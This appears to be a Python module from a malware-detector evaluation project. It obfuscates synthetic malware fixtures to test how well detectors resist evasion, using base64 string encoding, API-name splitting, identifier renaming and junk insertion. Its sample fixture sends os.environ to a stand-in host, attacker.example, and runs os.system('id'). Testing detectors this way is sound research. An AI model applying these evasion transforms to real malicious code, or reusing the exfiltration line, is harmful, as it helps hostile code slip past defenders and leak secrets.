"""Semantics-preserving obfuscation of code, for an adversarial-evasion test.

The project objective's central claim is that traditional tools "struggle to
identify novel threats, obfuscated malicious logic". The way to test that claim
rather than assert it is to take samples a detector already catches, obfuscate
them the way real malware does, and measure how much each detector's catch rate
drops. A signature/rule tool keys on surface strings (`os.system`, the payload
URL), so it should degrade sharply; a semantic reader should degrade less. Which
of those actually happens is the experiment.

SAFETY. These transforms operate on the synthetic, inert malware fixtures only.
They rewrite text; nothing here executes, compiles, or runs the code, and the
payload endpoints stay the non-routable placeholders they already were
(attacker.example / 127.0.0.1). Obfuscating an inert fixture leaves it inert.

The transforms mirror the standard evasion toolbox:

    encode_strings   string literals -> base64 with an inline decode, hiding
                     URLs and commands from anything that greps for them
    split_apis       os.system -> getattr(os, "sys"+"tem"); eval -> a spliced
                     name. Defeats exact-token signatures, which is the point.
    rename_locals    user identifiers -> opaque short names
    insert_junk      harmless no-op statements between real ones

`level` stacks them: 1 = strings only, 2 = strings + api-splitting,
3 = everything. Higher levels are strictly more hidden.

Deliberate limitation: the import graph is left intact (`import socket` is not
rewritten to `__import__("so"+"cket")`). Rules that key on imports therefore
survive, so the measured evasion is a LOWER BOUND - a real adversary who also
obfuscates imports would evade more, not less. Keeping imports readable also
keeps the fixtures obviously inert.
"""
from __future__ import annotations

import base64
import re

# API tokens a signature scanner keys on. Splitting these is the highest-value
# evasion, so they are handled explicitly rather than left to generic renaming.
SPLIT_TARGETS = [
    "os.system", "subprocess.Popen", "subprocess.call", "subprocess.run",
    "urllib.request", "requests.post", "requests.get", "socket.socket",
    "base64.b64decode", "eval", "exec", "__import__", "compile",
    "child_process", "gethostbyname",
]

STRING_LIT = re.compile(r'("([^"\\]|\\.){2,}?"|\'([^\'\\]|\\.){2,}?\')')
# identifiers a rename must never touch: keywords, builtins, and the module
# names whose attributes we rely on elsewhere
KEEP = {
    "import", "from", "as", "def", "class", "return", "if", "else", "elif",
    "for", "while", "try", "except", "finally", "with", "in", "is", "not",
    "and", "or", "None", "True", "False", "pass", "break", "continue", "lambda",
    "global", "nonlocal", "raise", "yield", "assert", "del", "self",
    "os", "sys", "subprocess", "socket", "base64", "requests", "urllib",
    "threading", "time", "uuid", "hashlib", "hmac", "json", "tempfile", "stat",
    "print", "open", "len", "range", "str", "int", "dict", "list", "set",
    "getattr", "setattr", "b64decode", "b32encode", "decode", "encode",
}


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def encode_strings(code: str) -> str:
    """Replace string literals with a base64 blob decoded at runtime (in text)."""
    def repl(m):
        lit = m.group(1)
        try:
            inner = lit[1:-1].encode().decode("unicode_escape")
        except Exception:
            return lit
        if len(inner) < 3 or "\n" in inner:
            return lit
        return f'__import__("base64").b64decode("{_b64(inner)}").decode()'
    # skip the module docstring / very first lines by only touching assignment RHS
    return STRING_LIT.sub(repl, code)


def split_apis(code: str) -> str:
    """Break signature-bait API names so an exact-token rule no longer matches."""
    out = code
    for target in SPLIT_TARGETS:
        if target not in out:
            continue
        if "." in target:
            mod, attr = target.rsplit(".", 1)
            cut = max(1, len(attr) // 2)
            spliced = f'getattr({mod}, "{attr[:cut]}" + "{attr[cut:]}")'
            out = out.replace(target, spliced)
        else:
            cut = max(1, len(target) // 2)
            # eval(  ->  getattr(__builtins__ or builtins, "ev"+"al")(
            spliced = (f'getattr(__import__("builtins"), '
                       f'"{target[:cut]}" + "{target[cut:]}")')
            out = re.sub(rf'\b{re.escape(target)}\b(?=\s*\()', spliced, out)
    return out


_JUNK = [
    "_ = 0",
    "if False:\n    pass",
    "__x = (1 + 1) * 2",
    "_tmp = 'debug'",
    "for _i in range(0):\n    pass",
]


def insert_junk(code: str, rng) -> str:
    lines = code.split("\n")
    out = []
    for ln in lines:
        out.append(ln)
        indent = len(ln) - len(ln.lstrip())
        if ln.strip() and not ln.rstrip().endswith((":", "\\")) and rng.random() < 0.15:
            junk = rng.choice(_JUNK).replace("\n", "\n" + " " * indent)
            out.append(" " * indent + junk)
    return "\n".join(out)


def rename_locals(code: str, rng) -> str:
    """Rename user identifiers (assignment targets / def names) to opaque names."""
    names = set()
    for m in re.finditer(r"\bdef\s+([a-zA-Z_]\w*)", code):
        names.add(m.group(1))
    for m in re.finditer(r"^\s*([a-zA-Z_]\w*)\s*=", code, re.M):
        names.add(m.group(1))
    names -= KEEP
    names = [n for n in names if len(n) > 1]
    mapping = {}
    for i, n in enumerate(sorted(names)):
        mapping[n] = f"_v{i}"
    out = code
    for n, v in mapping.items():
        out = re.sub(rf"\b{re.escape(n)}\b", v, out)
    return out


def obfuscate(code: str, level: int = 3, seed: int = 0) -> str:
    """Return an obfuscated-but-equivalent version of `code` (text only)."""
    import random
    rng = random.Random(seed)
    out = code
    if level >= 2:
        out = split_apis(out)          # before string-encoding, or the names vanish
    if level >= 1:
        out = encode_strings(out)
    if level >= 3:
        out = rename_locals(out, rng)
        out = insert_junk(out, rng)
    return out


if __name__ == "__main__":
    sample = '''import os, requests
def _collect():
    data = os.environ
    requests.post("http://attacker.example/collect", json=data)
os.system("id")
'''
    for lvl in (1, 2, 3):
        print(f"===== level {lvl} =====")
        print(obfuscate(sample, lvl))
        print()
